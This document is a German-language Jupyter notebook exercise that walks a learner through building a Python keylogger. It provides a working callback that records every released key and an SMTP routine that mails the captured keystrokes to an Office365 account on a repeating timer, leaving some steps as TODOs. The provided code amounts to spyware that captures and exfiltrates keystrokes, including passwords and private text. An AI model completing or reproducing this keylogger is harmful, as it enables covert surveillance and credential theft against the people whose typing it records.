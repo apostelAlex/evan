{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Heute bauen wir unseren ersten Keylogger.\n",
    "Dafür benutzen wir die Library keyboard\n",
    "Hier kommt dafür der erste Command: pip<br>\n",
    "pip ist die Paketverwaltung in Python. <br>\n",
    "Wir führen folgenden Code aus, um unsere Library zu installieren:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install keyboard"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Jetzt importiere die Library."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# todo"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Ich importiere weitere Libraries, damit wir unseren Keylogger auch testen können.<br>\n",
    "Das ist erst einmal nicht wichtig."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib # for sending email using SMTP protocol (gmail)\n",
    "# Timer is to make a method runs after an `interval` amount of time\n",
    "from threading import Timer\n",
    "import time\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on\n",
    "EMAIL_ADDRESS = \"\"\n",
    "EMAIL_PASSWORD = \"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Mache dich hier mit der time.time() Funktion vertraut.\n",
    "# Hinweise: Über str(x) kannst du x zu einem String machen.\n",
    "#           Über int(x) kannst du x zu einer ganzen Zahl machen.\n",
    "# Du kannst diesen Schritt erst einmal überspringen, komme aber später dazu zurück, wenn du \n",
    "# deinen Dateinamen erstellen willst.\n",
    "time.time()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Erstelle nun eine Keylogger-Klasse, die wie folgt initialisiert wird: \n",
    "1. Unsere Konstruktor-Methode (\\__init__) soll 3 Parameter haben: sich selbst, und ein Intervall.\n",
    "2. initialisiere eine Klassenvariable interval.\n",
    "3. Lege zusätzlich eine Variable log an, die du mit einem leeren String initialisierst.\n",
    "4. Speichere außerdem die Startzeit des Programms mit der library time."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Keylogger:\n",
    "    \n",
    "    # Todo\n",
    "\n",
    "\n",
    "    def callback(self, event):\n",
    "        \"\"\"\n",
    "            Hier ist eine Funktion gegeben, die sobald eine Taste losgelassen wird, laufen wird.\n",
    "\n",
    "        \"\"\"\n",
    "        name = event.name\n",
    "        if len(name) > 1:\n",
    "            # not a character, special key (e.g ctrl, alt, etc.)\n",
    "            # uppercase with []\n",
    "            if name == \"space\":\n",
    "                # \" \" instead of \"space\"\n",
    "                name = \" \"\n",
    "            elif name == \"enter\":\n",
    "                # add a new line whenever an ENTER is pressed\n",
    "                name = \"[ENTER]\\n\"\n",
    "            elif name == \"decimal\":\n",
    "                name = \".\"\n",
    "            else:\n",
    "                # replace spaces with underscores\n",
    "                name = name.replace(\" \", \"_\")\n",
    "                name = f\"[{name.upper()}]\"\n",
    "        # finally, add the key name to our global `self.log` variable\n",
    "        self.log += name\n",
    "    \n",
    "\n",
    "    # TODO\n",
    "    def update_filename(self):\n",
    "        \"\"\"\n",
    "            Du möchtest in dieser Funktion einen String bauen, der die Startzeit und Endzeit enthält.\n",
    "            Benutze dafür unter anderem deine bei Initialisierung erstellte Variable.\n",
    "        \"\"\"\n",
    "        fn = \"keylog-\"\n",
    "        self.filename = fn\n",
    "\n",
    "\n",
    "    # TODO\n",
    "    def report_to_file(self):\n",
    "        \"\"\"This method creates a log file in the current directory that contains\n",
    "        the current keylogs in the `self.log` variable\"\"\"\n",
    "        \n",
    "        # open the file in write mode (create it)\n",
    "        with open(self.filename, \"w\") as f:\n",
    "            pass # schreibe hier den Log in die Datei!!\n",
    "\n",
    "        print(f\"[+] Saved {self.filename}.txt\")\n",
    "\n",
    "\n",
    "    # Diese Funktion ist vorgegeben, damit du nicht so viel zu tun hast.\n",
    "    def prepare_mail(self, message):\n",
    "        \"\"\"Utility function to construct a MIMEMultipart from a text\n",
    "        It creates an HTML version as well as text version\n",
    "        to be sent as an email\"\"\"\n",
    "        msg = MIMEMultipart(\"alternative\")\n",
    "        msg[\"From\"] = EMAIL_ADDRESS\n",
    "        msg[\"To\"] = EMAIL_ADDRESS\n",
    "        msg[\"Subject\"] = \"Keylogger logs\"\n",
    "        # simple paragraph, feel free to edit\n",
    "        html = f\"<p>{message}</p>\"\n",
    "        text_part = MIMEText(message, \"plain\")\n",
    "        html_part = MIMEText(html, \"html\")\n",
    "        msg.attach(text_part)\n",
    "        msg.attach(html_part)\n",
    "        # after making the mail, convert back as string message\n",
    "        return msg.as_string()\n",
    "\n",
    "\n",
    "    # Diese auch (thank me later)\n",
    "    def sendmail(self, email, password, message):\n",
    "        # manages a connection to an SMTP server\n",
    "        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com\n",
    "        server = smtplib.SMTP(host=\"smtp.office365.com\", port=587)\n",
    "        # connect to the SMTP server as TLS mode ( for security )\n",
    "        server.starttls()\n",
    "        # login to the email account\n",
    "        server.login(email, password)\n",
    "        # send the actual message after preparation\n",
    "        server.sendmail(email, email, self.prepare_mail(message))\n",
    "        # terminates the session\n",
    "        server.quit()\n",
    "\n",
    "\n",
    "    # TODO\n",
    "    def report(self):\n",
    "        \"\"\"\n",
    "        This function gets called every `self.interval`\n",
    "        It basically sends keylogs and resets `self.log` variable\n",
    "        \"\"\"\n",
    "        if self.log:\n",
    "            # update `self.filename`\n",
    "            self.update_filename()\n",
    "            # Schicke nun eine E-Mail und erstelle eine File.\n",
    "            \n",
    "            # TODO\n",
    "\n",
    "            # Resette nun die startzeit.\n",
    "            # TODO\n",
    "\n",
    "        # Setze nun die Log-Variable zurück    \n",
    "        # todo\n",
    "\n",
    "        # Hier kommt eine coole line Code. Es wird keine echte Rekursion benutzt, sieht nur so aus!!\n",
    "        timer = Timer(interval=self.interval, function=self.report)\n",
    "        # set the thread as daemon (dies when main thread die)\n",
    "        timer.daemon = True\n",
    "        # start the timer\n",
    "        timer.start()\n",
    "\n",
    "\n",
    "    # TODO\n",
    "    def start(self):\n",
    "        # record the start datetime\n",
    "\n",
    "        # Todo\n",
    "\n",
    "        # start the keylogger\n",
    "        keyboard.on_release(callback=self.callback)\n",
    "        # start reporting the keylogs\n",
    "        self.report()\n",
    "        # block the current thread, wait until CTRL+C is pressed\n",
    "        keyboard.wait()   \n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, das war jetzt mal Arbeit. \n",
    "Wir müssen nur noch unseren Keylogger starten!\n",
    "Erstelle dafür eine Keylogger-Instanz und führe auf dieser die start-Funktion aus!\n",
    "Das wars!!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    pass\n",
    "    # TODO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Kurzer Hinweis zur line: <br>\n",
    "`if __name__ == \"__main__\":` <br> <br>\n",
    "Das ist eine if-Abfrage, ob die Python-interne Variable `__name__` den Wert `__main__` hat. <br>\n",
    "Dieser Code wird nur dann ausgeführt, wenn die Datei selbst ausgeführt wird und nicht importiert wird. <br>\n",
    "Dies zu benutzen hat mehrere Vorteile: \n",
    "1. Du kannst eine Datei als Library nutzen (importieren) und auf deren Funktionen zugreifen, ohne dass die Standardanwendung des Programms läuft. Beispiel: Datei übersetzt einen String auf Englisch. Ich kann also meinen Code dafür benutzen über einen Input eine .txt Datei einzulesen und eine Übersetzung auszugeben. Zusätzlich kann ich aber auch mein Programm importiern und Texte übersetzen, ohne ein Input Feld zu bekommen, wenn ich dieses Programm importiere.\n",
    "\n",
    "2. Du kannst diesen Abschnitt auch zum Testen benutzen. Da dieser Code nur dann ausgeführt wird, wenn das Programm selbst aufgerufen wird, können Funktionen sehr angenehm getestet werden. (Benutze ich sehr gerne)\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
